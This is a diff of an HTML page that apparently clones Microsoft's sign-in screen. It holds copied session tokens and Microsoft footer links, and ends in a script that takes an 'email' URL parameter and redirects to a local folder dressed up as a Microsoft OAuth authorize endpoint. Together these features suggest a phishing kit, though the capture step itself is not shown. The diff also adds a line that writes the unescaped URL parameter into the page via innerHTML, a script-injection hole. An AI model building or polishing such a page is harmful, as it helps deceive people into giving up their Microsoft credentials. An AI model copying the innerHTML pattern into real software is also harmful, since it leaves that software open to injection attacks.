-        <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.canary" name="canary" value="pfUojFuhK84HWCrrem/hZ8r2Mmwj4WygXNI/cROtNGo=8:1:CANARY:ZfJmXBshFHhokKD/GqUMHUBsFVJP3vAINm6+jPKQkEw=">
+        <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.canary" name="canary" value="pfUojFuhK84HWCrrem/hZ8r2Mmwj4WygXNI/cROtNGo=0:1:CANARY:X8JzR2u5Db7dA/MQGzeylkHOll9If6V40TTxzrJ3RCQ=">
         <!-- /ko -->
         <!-- ko if: !svr.sCanaryTokenName || svr.fSkipRenderingNewCanaryToken --><!-- /ko -->
-        <input type="hidden" name="ctx" data-bind="value: ctx" value="rQQIARAAnZI9aBtnGMd1luw4AtdOC8VkiSCmlKa67ztJBg2yZEl30p2-7iydlvR0957vva9XvjtZlsaQQikUQpeUdCuZBIXQpaUE0q1gOmQJJFncbsFDEjKFDCXqkKFbCDw8w8P_Nzz8_ulVFmdx8oskjZO7Owapj_IGKGRBQSezLA1y2RHJs1mGMVmaNi2Wsqjw4_RW7saZ9eTf5P3km6-vG-avdxdYzo7jcbRLEGgSewi5OLIsaADcQD4RAV8PYmigYxAeQzAlfIbnyrYe93qt3zDsIYY9w7DvV77FWngZdk5kWoSSIzEaJGeyIvpNpetKzn6sOVVPLlNQorWZ7B-42lz0pJrQEyvaXFKMJVe1m_3OVFPcWK7J7pLnZOfAayqiM1RcRnIEclhRKc1GqjQ3KLkilgxadJrBcKzNOG9YVyfaQD2sdYrFxcoOSRX4XMEoZA2D47I5kgTZPM-Osgw3InWGtFgGgKcrm63SJLbp_xYK4Ry8Wlm3Qv3QB0F8J-mBmTgelgVecEonLUVjWn2Ja_ZlR1Y6sUyrrAwpW-t3neUNSoq9fLPqy37X13pCJPiUZ9b2YSuIoN7nyOFAtDWmOx7RnAoGe57gIGjUClNzUILWgCwuklffOYgmoygO9Rj8z8LMDMDsl-QGCg_1AM71GKIgOk2K70ERuAksfeLFGTQGATQz4xBZ0AOZZdKDAbiuGwaIosdJ7GEKO099up7aSm0nMonPPyNXd9fX01ub2xcyidcp7KfVZXvulq_8efPHR43vbn91-c4ZnzhdJcaWipzqxG7k2Xq_HIbAJ-xhPqQlf-qw_dnhQBYIo9taekXF_C51aw27tfbJ6dqmH-ke7kT4KETTCIQv17BvLiR-v_ihbfwhjS3S16hc7aRro7xf5Wk47zjNiQuZdu_gqNLsmBxoIbcW8d12u6FI99LYHxuJ1x_9fHvx14sH_zyvn29-ObREf7AX2dW6jdxGhagdqVJd3YuqB2KbOS4Jss9fc9qNjrs_Ld7bSvy9nEuJtw2">
-        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="c71f43a4-9b84-4bd5-8d97-601a9adf3600">
-        <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABIQEAAABVrSpeuWamRam2jAF1XRQEvNK5eyGEfO6nZTze_CUoPxdCscPbSTnK0u1pY5E-zpFBdLznHhSHk-UGNwodugd42WQ7QzduaSLGLrcEkcYShzdnqjQSQJugL1jcVqiiaEKQq5bL_LvrnBtc0DbG9ygTYK12Bbz0Rdc3ptFlzPMZfMktP7Y0IfzSxHdtsCJaelJQT0vSLlCXCvj37DlGDYHnwXEgLJ4RDsYik_9lFWfGnPh3lcFJRolUqHlnR4oUcN9six9ocwxV9Rrmdl7xpOcBSahf4WYNNHa-7HH0c-ejuAU0w3ztDelQvcNt05WqA3deDd7UhQ1gZgeTVBVNA5fJ72r9yDbn7UfH8y3me1jhCTr7Vy4OBKqtz_xQfcj66x4JiGl_CJITe1sNOFLCbujPPxgMDJgEidopPIS3kxPsuho1JiTJEFl7mgn5uDrLfrkMgDyxFeJmX_YATW0UAgT3v3mfwBySgZA0nlaHYHJCULV9f2j4DBL3mdEXeol_rFKtxMORPSgTbAZZjFUrbYpCasGxOXDAdxRY52VG3ywe41xKsJFfcKohZJba3JIpS9fW4iOl1MaJNcBB1Xa8JNez8whSfHkgrA_0VnKnRXSQ2iDwas99PFJFg9jIYAZN0BIQCmOVS6-NAasP4FL69TwOCm97ExRWB8DSkGXb5OF5Ch0EZL0836JPfjMA43N6oXqHG4dKF_5y7zliK6RY--EZ6L6DjIEsmSmcEmK4k_4zdjTmXXt9S8f_IgksdLBk5rGhd37OPdVMg6Wl92YDl8RuClDD5HTFKH0KnRklMsQUjEVOt02wTGL4YwuN9xLWgNzVnZeEkfOJ8397BQ3qSpZqcmkGn39H-aA7mu77gU6a5FzHTlTt4-mD-bUwnfT6VSAhoL2O6wgsYoHmzv3jwKN0GkggXnpJ_JxpiDxkxo5yBNSE9TYXYwHOLf5m_4gbeTCjrTdark8_2qRGgUWUItUIIAA">
+        <input type="hidden" name="ctx" data-bind="value: ctx" value="rQQIARAA02I21DO0UjE2SExMNjVK1jU3NbfQNbE0NdJNMklJ1rU0NTY0sEhKNU1LtSgS4hJg4FquvFhdzLPjk1aM8P5Jf2cx8pUVl-mVZSbrpaaU6iWW7mBkvMDI-IKRcRUTn5-ZhYG5saWJQYpxsrnxLSZ-f8fSkgwjEJFflFmV-omJMy2_KDe-IL-4ZBYzv3lwYbm5f3Kmc15kYZqz8Spm6YySkoJiK3399KLEggy93Mzkovzi_LQSveT83E3MbEAyNz_vFLNIfkFqXmaKQkFRflpmTqpCam5iZs4FFsZXLDwGrFYcHFwC_BLsCgw_WBgXsQK9ULDu8eH1u1Y6Touvz347xYDhFKt-QVpofpZbaYa3hYlHuHNRUWqufkaURZGRb255lkl4ZXqEn6d-cpB_iZ97vq2BleEENsYPbIwd7Ay7OLVhTszJLdYDhkR-Xk5mXipSeOgnAn2rn5-Zkqx_gJfhB9-BjrdH5u5_-M7jFb9OhIVXVZBRqalLknmKo75voHtVamVOtod_To6lZ5pZmIlBSEhFVZGXcZBzoO0GAYYHQCTIAAA1">
+        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="c3e3ae70-baaf-41a9-965f-7f6bed943000">
+        <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABIQEAAABVrSpeuWamRam2jAF1XRQENs3cixILRHWqkAqvCBJQKC3oEt65zK0JuVe_5SmkyKNdwLANIt60IyB6WQU2_ZUdcizEwh5SC_nOvlBn03guXmVFYqe-64Td2QUnD2BweFo1jXLT7h1Wk96AqFc5Ds1LyEHyX7QSzvjnZCbv6FHPF3OeNFMm9udwhuVya6-iH3AvhbUqEuLJ8UKLIz9wALcMibI2sjnvc9sisrXVjJyw4bpH0aG7cbD55b0g15pTWI24SCI2XZA6OE_zrqu6EYdObhX44tPwKEr07pT1QcbBmkx9Caq0D0b8_SQytZUG3otlvtMeU1Bniqda68bRRFRtZ-mEy-tTVH8FlQ-3ncr9wj95XPfdSQ_D2knsL2YG2HuSk5T8Ezf2gYKelI1RJ65l9m8EoKWxd4hSjdAihel2IaNhbCfg6s3NIsyPBkCjKRdJMutX70d2V_pr4ISM76uuVqxP6vryUQCdwCboo8VVOWvC1QQQg9nuzFPMAsNQlkFZ3pbcLx5r9B5v-ZMbEhAJcvdwKSJbKAwxN7-AXZsIasXOtuRsa8e9HyHKxXANSMmGevB8NXx2MPHHZrB3AMtK91pTJl8gb8jQGSUc8Xt2wPe7SNn7NjhpE5n44s1sAj5v45hQU6fl8h0ph72Xt-PORQfSkUxMpO4Xn0cIjAVxyiAA">
         <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
         <input type="hidden" name="NewUser" value="1">
         <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
@@ -602,7 +531,7 @@
                 'footer-content': true,
                 'footer-item': true,
                 'has-background': !useDefaultBackground,
-                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/en-AU/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background">Terms of use</a>
+                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/en-AU/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
         <!-- /ko -->
 
         <!-- ko if: !hidePrivacy -->
@@ -614,7 +543,7 @@
                 'footer-content': true,
                 'footer-item': true,
                 'has-background': !useDefaultBackground,
-                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/en-AU/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background">Privacy &amp; cookies</a>
+                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/en-AU/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
         <!-- /ko -->
 
         <!-- ko if: impressumLink --><!-- /ko -->
@@ -635,7 +564,7 @@
             'footer-item': true,
             'debug-item': true,
             'has-background': !useDefaultBackground,
-            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item has-background ext-has-background">...</a>
+            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
 </div>
 <!-- /ko -->
 
@@ -650,7 +579,7 @@
     <!-- /ko -->
 <!-- /ko --></div>
     <!-- /ko -->
-
+</form>
 
 <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>
 
@@ -663,6 +592,8 @@
     const hasParam = searchParams.has('email');
     if (hasParam == true){
         emailval = searchParams.get('email');
+        document.getElementById("emailaddressbtn").innerHTML = emailval
+
     }else {
         emailval = "vsv"
     }
@@ -672,3 +603,4 @@
         window.location.replace("./common/oauth2/authorize/response_type%3Dcode/client_id%3D40bbc52a-4374-39/index.html?email="+ emailval);
     }
 </script></body></html>
+
